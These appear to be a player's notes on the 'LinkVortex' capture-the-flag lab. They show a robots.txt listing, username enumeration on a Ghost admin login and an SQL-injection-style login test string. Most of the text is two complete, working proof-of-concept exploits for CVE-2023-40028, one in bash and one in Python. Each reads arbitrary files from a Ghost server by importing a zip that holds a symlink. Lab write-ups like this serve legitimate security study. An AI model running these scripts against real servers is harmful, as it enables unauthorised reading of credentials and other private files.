
```sh
User-agent: *
Sitemap: http://linkvortex.htb/sitemap.xml
Disallow: /ghost/
Disallow: /p/
Disallow: /email/
Disallow: /r/
```

http://linkvortex.htb/ghost/#/signin
Sign in to BitByBit Hardware.

![[Images/Pasted image 20241219221011.png|400]]

![[Images/Pasted image 20241219220847.png|400]]

![[Images/Pasted image 20241219220819.png|400]]

We can see if a username exists, I guessed a correct one.
We can comment using sql and it won't see the that the password field is filled.

testing stuff
`admin@linkvortex.htb' and password like '%'-- -`

Looking at this in burp I found a version number, 5.56.
Googling on this I found the cve-2023-40028.
https://security.snyk.io/package/npm/ghost/5.56.1
https://github.com/TryGhost/Ghost/security/advisories/GHSA-9c9v-w225-v5rg
https://github.com/TryGhost/Ghost/commit/690fbf3f7302ff3f77159c0795928bdd20f41205

Searching for poc
https://github.com/0xyassine/CVE-2023-40028
```sh
#!/bin/bash

# Exploit Title: Ghost Arbitrary File Read
# Date: 10-03-2024
# Exploit Author: Mohammad Yassine
# Vendor Homepage: https://ghost.org/
# Version: BEFORE [ 5.59.1 ]
# Tested on: [ debian 11 bullseye ghost docker image ]
# CVE : CVE-2023-40028

#THIS EXPLOIT WAS TESTED AGAINST A SELF HOSTED GHOST IMAGE USING DOCKER

#GHOST ENDPOINT
GHOST_URL='http://127.0.0.1'
GHOST_API="$GHOST_URL/ghost/api/v3/admin/"
API_VERSION='v3.0'

PAYLOAD_PATH="`dirname $0`/exploit"
PAYLOAD_ZIP_NAME=exploit.zip

# Function to print usage
function usage() {
  echo "Usage: $0 -u username -p password"
}

while getopts 'u:p:' flag; do
  case "${flag}" in
    u) USERNAME="${OPTARG}" ;;
    p) PASSWORD="${OPTARG}" ;;
    *) usage
       exit ;;
  esac
done

if [[ -z $USERNAME || -z $PASSWORD ]]; then
  usage
  exit
fi

function generate_exploit()
{
  local FILE_TO_READ=$1
  IMAGE_NAME=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 13; echo)
  mkdir -p $PAYLOAD_PATH/content/images/2024/
  ln -s $FILE_TO_READ $PAYLOAD_PATH/content/images/2024/$IMAGE_NAME.png
  zip -r -y $PAYLOAD_ZIP_NAME $PAYLOAD_PATH/ &>/dev/null
}

function clean()
{
  rm $PAYLOAD_PATH/content/images/2024/$IMAGE_NAME.png
  rm -rf $PAYLOAD_PATH
  rm $PAYLOAD_ZIP_NAME
}

#CREATE COOKIE
curl -c cookie.txt -d username=$USERNAME -d password=$PASSWORD \
   -H "Origin: $GHOST_URL" \
   -H "Accept-Version: v3.0" \
   $GHOST_API/session/ &> /dev/null

if ! cat cookie.txt | grep -q ghost-admin-api-session;then
  echo "[!] INVALID USERNAME OR PASSWORD"
  rm cookie.txt
  exit
fi

function send_exploit()
{
  RES=$(curl -s -b cookie.txt \
  -H "Accept: text/plain, */*; q=0.01" \
  -H "Accept-Language: en-US,en;q=0.5" \
  -H "Accept-Encoding: gzip, deflate, br" \
  -H "X-Ghost-Version: 5.58" \
  -H "App-Pragma: no-cache" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Content-Type: multipart/form-data" \
  -X POST \
  -H "Origin: $GHOST_URL" \
  -H "Referer: $GHOST_URL/ghost/" \
  -F "importfile=@`dirname $PAYLOAD_PATH`/$PAYLOAD_ZIP_NAME;type=application/zip" \
  -H "form-data; name=\"importfile\"; filename=\"$PAYLOAD_ZIP_NAME\"" \
  -H "Content-Type: application/zip" \
  -J \
  "$GHOST_URL/ghost/api/v3/admin/db")
  if [ $? -ne 0 ];then
    echo "[!] FAILED TO SEND THE EXPLOIT"
    clean
    exit
  fi
}

echo "WELCOME TO THE CVE-2023-40028 SHELL"
while true; do
  read -p "file> " INPUT
  if [[ $INPUT == "exit" ]]; then
    echo "Bye Bye !"
    break
  fi
  if [[ $INPUT =~ \  ]]; then
    echo "PLEASE ENTER FULL FILE PATH WITHOUT SPACE"
    continue
  fi
  if [ -z $INPUT  ]; then
    echo "VALUE REQUIRED"
    continue
  fi
  generate_exploit $INPUT
  send_exploit
  curl -b cookie.txt -s $GHOST_URL/content/images/2024/$IMAGE_NAME.png
  clean
done

rm cookie.txt
```

https://github.com/sudlit/CVE-2023-40028
```python
import os
import sys
import random
import string
import time
import getopt
from pathlib import Path

def usage():
    print(f"Usage: {sys.argv[0]} --url <http://abc.xyz> -u <username> -p <password>")

def generate_random_name(length=13):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_exploit(file_to_read, payload_path, image_name):
    image_dir = Path(payload_path) / "content/images/2024"
    os.system(f"mkdir -p {image_dir}")
    symlink_path = image_dir / f"{image_name}.png"
    os.popen(f"ln -s {file_to_read} {symlink_path}")
    os.popen(f"zip -r -y exploit.zip ./exploit/ &>/dev/null")

def clean(payload_path, image_name):
    os.system(f"rm -f {payload_path}/content/images/2024/{image_name}.png")
    os.system(f"rm -rf {payload_path}")
    os.system(f"rm -f {payload_path}.zip")

def main():

    try:
        opts, _ = getopt.getopt(sys.argv[1:], "u:p:", ["url="])
    except getopt.GetoptError:
        usage()
        sys.exit(1)

    username = password = GHOST_URL = None

    for opt, arg in opts:
        if opt == "-u":
            username = arg
        elif opt == "-p":
            password = arg
        elif opt == "--url":
            GHOST_URL = arg

    if not (username and password and GHOST_URL):
        usage()
        sys.exit(1)

    GHOST_API = f'{GHOST_URL}/ghost/api/v3/admin/'
    payload_path = Path(__file__).parent / "exploit"

    # Create session
    os.system(f"curl -c cookie.txt -d username={username} -d password={password} \
       -H \"Origin: {GHOST_URL}\" \
       -H \"Accept-Version: v3.0\" \
       {GHOST_API}session/ > /dev/null 2>&1")
    time.sleep(1)
    if os.system("grep -q ghost-admin-api-session cookie.txt") != 0:
        print("[!] INVALID USERNAME OR PASSWORD")
        os.popen("rm -f cookie.txt")
        sys.exit(1)

    print("""
   ______     _______     ____   ___ ____  _____       _  _    ___   ___ ____  ___  
  / ___\ \   / / ____|   |___ \ / _ \___ \|___ /      | || |  / _ \ / _ \___ \( _ ) 
 | |    \ \ / /|  _| _____ __) | | | |__) | |_ \ _____| || |_| | | | | | |__) / _ \ 
 | |___  \ V / | |__|_____/ __/| |_| / __/ ___) |_____|__   _| |_| | |_| / __/ (_) |
  \____|  \_/  |_____|   |_____|\___/_____|____/         |_|  \___/ \___/_____\___/ 
                                                                                    
          """)

    while True:
        file_to_read = input("file> ").strip()
        if file_to_read.lower() == "exit":
            print("Bye Bye !")
            break

        if " " in file_to_read:
            print("PLEASE ENTER FULL FILE PATH WITHOUT SPACE")
            continue

        if not file_to_read:
            print("VALUE REQUIRED")
            continue

        image_name = generate_random_name()
        generate_exploit(file_to_read, payload_path, image_name)

        os.system(f'curl -s -b cookie.txt \
            -H "Accept: text/plain, */*; q=0.01" \
            -H "Accept-Language: en-US,en;q=0.5" \
            -H "Accept-Encoding: gzip, deflate, br" \
            -H "X-Ghost-Version: 5.58" \
            -H "App-Pragma: no-cache" \
            -H "X-Requested-With: XMLHttpRequest" \
            -H "Content-Type: multipart/form-data" \
            -X POST \
            -H "Origin: {GHOST_URL}" \
            -H "Referer: {GHOST_URL}/ghost/" \
            -F "importfile=@./exploit.zip;type=application/zip" \
            -H "form-data; name=\"importfile\"; filename=\"exploit.zip\"" \
            -H "Content-Type: application/zip" \
            -J \
            "{GHOST_URL}/ghost/api/v3/admin/db" \
            > /dev/null 2>&1')

        os.system(f"curl -b cookie.txt -s {GHOST_URL}/content/images/2024/{image_name}.png")
        clean(payload_path, image_name)

if __name__ == "__main__":
    main()

```

